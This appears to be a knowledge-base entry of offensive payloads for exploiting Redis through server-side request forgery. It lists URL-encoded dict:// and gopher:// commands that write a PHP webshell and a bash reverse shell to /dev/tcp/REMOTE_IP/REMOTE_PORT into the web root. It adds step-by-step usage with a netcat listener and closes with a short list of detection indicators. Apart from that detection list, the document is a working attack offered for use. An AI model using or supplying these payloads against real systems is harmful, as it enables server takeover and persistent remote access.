---
type: code
language: text
verified: true
tags:
  - ssrf
  - redis
  - webshell
  - reverse-shell
  - payload
platforms:
  - Linux
  - Web
validated: true
---

# Redis-SSRF-Payloads-for-Webshell-and-Reverse-Shell

## Code

```
# Getting a webshell
url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
url=dict://127.0.0.1:6379/SET%20mykey%20"<?php system($_GET[0])?>"
url=dict://127.0.0.1:6379/SAVE

# Getting a PHP reverse shell
gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
gopher://127.0.0.1:6379/_set%20payload%20%22<?php%20shell_exec('%20bash%20-i%20>&%20/dev/tcp/REMOTE_IP/REMOTE_PORT%200>&1');%20?>"%22
gopher://127.0.0.1:6379/_save
```

## Description

These are URL-encoded payloads for SSRF exploitation of Redis, enabling the creation of PHP webshell and reverse shell files via Redis persistence. The dict:// URLs handle basic CONFIG/SET/SAVE for the webshell, while gopher:// is used for the reverse shell to better encode the protocol. These snippets are pre-formatted for injection into vulnerable SSRF parameters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| REMOTE_IP | Attacker's IP for reverse shell connection | 10.0.0.1 |
| REMOTE_PORT | Port for the listener (e.g., netcat) | 4444 |

## Usage

Substitute these URLs into the SSRF parameter of the vulnerable app (e.g., ?url=) and send via curl or browser. For reverse shell, start a listener first (nc -lvnp REMOTE_PORT). After SAVE, access the generated /file.php or /reverse.php via HTTP to execute.

## Detection

- WAF logs for dict:// or gopher:// protocols in requests.
- Redis logs showing CONFIG SET dir/dbfilename or unexpected SAVE.
- File monitoring in /var/www/html for sudden .php files with system/shell_exec.
- Network flows from web server to localhost:6379 or outbound TCP to attacker IP/port.

## Related

- [[procedures/Redis-SSRF-Exploitation-for-Webshell-and-Reverse-Shell]]
